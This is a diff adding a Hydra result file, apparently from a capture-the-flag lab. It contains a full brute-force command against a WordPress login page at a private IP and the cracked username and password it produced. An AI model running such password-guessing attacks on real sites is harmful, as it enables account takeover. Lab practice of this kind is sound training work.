@@ -1,0 +1,2 @@
+# Hydra v8.6 run at 2021-06-17 15:31:04 on 10.10.246.167 http-post-form (hydra -l Elliot -P fsocity.dic -V -f -o pass.hydra -t 30 -I 10.10.246.167 http-post-form /wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the)
+[80][http-post-form] host: 10.10.246.167   login: Elliot   password: ER28-0652
